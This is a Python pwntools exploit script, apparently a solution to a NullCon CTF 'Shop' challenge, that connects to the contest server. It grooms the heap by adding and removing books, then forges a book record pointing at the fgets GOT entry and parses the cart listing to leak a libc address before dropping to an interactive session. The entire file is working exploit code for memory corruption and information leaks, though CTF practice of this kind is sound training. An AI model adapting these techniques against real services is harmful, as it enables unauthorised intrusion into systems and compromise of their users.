from pwn import *

def get_prompt():
	return p.recvuntil("> ")

def add_book(name,name_length,price):
	p.sendline("1")
	p.recvuntil("Book name length: ")
	p.sendline(str(name_length))
	p.recvuntil("Book name: ")
	p.send(name)
	p.recvuntil("Book price: ")
	p.sendline(str(price))
	get_prompt()

def remove_book(idx):
	p.sendline("2")
	p.recvuntil("Book index: ")
	p.sendline(str(idx))
	get_prompt()

def list_book():
	p.sendline("3")
	ENDING = '''
	NullCon Shop
	(1) Add book to cart
	(2) Remove from cart
	(3) View cart
	(4) Check out
	> 
	'''
	data = get_prompt().strip(ENDING)
	return data

p = remote("pwn.ctf.nullcon.net",4002)

for i in range(5):
	add_book("a"*0x10,0x10,100)

remove_book(0)
remove_book(1)

setbuf_got = 0x602040
fgets_got = 0x602060
FS = "FORMAT_STRING"
fake_book = p64(1234)+p64(fgets_got)+p64(3344)+FS

add_book(fake_book,0x38,100)

books = eval(list_book())["Books"]
leak = u64(books[0]['name'].ljust(8,"\x00"))

log.info("LEAK: 0x%x"%leak)

#libc: libc6_2.27-3ubuntu1_amd64
p.interactive()